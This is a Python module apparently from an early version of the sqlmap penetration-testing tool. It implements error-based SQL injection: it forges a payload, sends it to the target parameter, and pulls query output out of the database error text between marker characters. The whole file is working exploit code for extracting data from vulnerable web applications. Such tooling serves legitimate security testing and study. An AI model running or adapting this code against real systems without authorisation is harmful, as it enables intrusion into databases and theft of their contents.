#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2010 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

import re
import time

from lib.core.agent import agent
from lib.core.common import getUnicode
from lib.core.common import randomInt
from lib.core.common import replaceNewlineTabs
from lib.core.common import safeStringFormat
from lib.core.convert import urlencode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.session import setError
from lib.core.unescaper import unescaper
from lib.request.connect import Connect as Request
from lib.utils.resume import resume

from lib.core.settings import ERROR_SPACE
from lib.core.settings import ERROR_EMPTY_CHAR
from lib.core.settings import ERROR_START_CHAR
from lib.core.settings import ERROR_END_CHAR

def errorUse(expression):
    """
    Retrieve the output of a SQL query taking advantage of an error SQL
    injection vulnerability on the affected parameter.
    """
    output         = None
    logic          = conf.logic
    randInt        = randomInt(1)
    query          = agent.prefixQuery(" %s" % queries[kb.misc.testedDbms].error.query)
    query          = agent.postfixQuery(query)
    payload        = agent.payload(newValue=query)
    startLimiter   = ""
    endLimiter     = ""

    expressionUnescaped = expression

    if kb.dbmsDetected:
        _, _, _, _, _, _, fieldToCastStr = agent.getFields(expression)
        nulledCastedField                = agent.nullAndCastField(fieldToCastStr)

        if kb.dbms == "MySQL":
            nulledCastedField            = nulledCastedField.replace("CHAR(10000)", "CHAR(255)") #fix for that 'Subquery returns more than 1 row'

        expressionReplaced               = expression.replace(fieldToCastStr, nulledCastedField, 1)
        expressionUnescaped              = unescaper.unescape(expressionReplaced)
        startLimiter                     = unescaper.unescape("'%s'" % ERROR_START_CHAR)
        endLimiter                       = unescaper.unescape("'%s'" % ERROR_END_CHAR)
    else:
        expressionUnescaped              = kb.misc.handler.unescape(expression)
        startLimiter                     = kb.misc.handler.unescape("'%s'" % ERROR_START_CHAR)
        endLimiter                       = kb.misc.handler.unescape("'%s'" % ERROR_END_CHAR)

    debugMsg = "query: %s" % expressionUnescaped
    logger.debug(debugMsg)

    forgedPayload = safeStringFormat(payload, (logic, randInt, startLimiter, expressionUnescaped, endLimiter))
    result = Request.queryPage(urlencode(forgedPayload), content=True)

    match = re.search('%s(?P<result>.*?)%s' % (ERROR_START_CHAR, ERROR_END_CHAR), result[0], re.DOTALL | re.IGNORECASE)
    if match:
        output = match.group('result')
        if output:
            output = output.replace(ERROR_SPACE, " ").replace(ERROR_EMPTY_CHAR, "")

            if conf.verbose > 0:
                infoMsg = "retrieved: %s" % replaceNewlineTabs(output, stdout=True)
                logger.info(infoMsg)

    return output
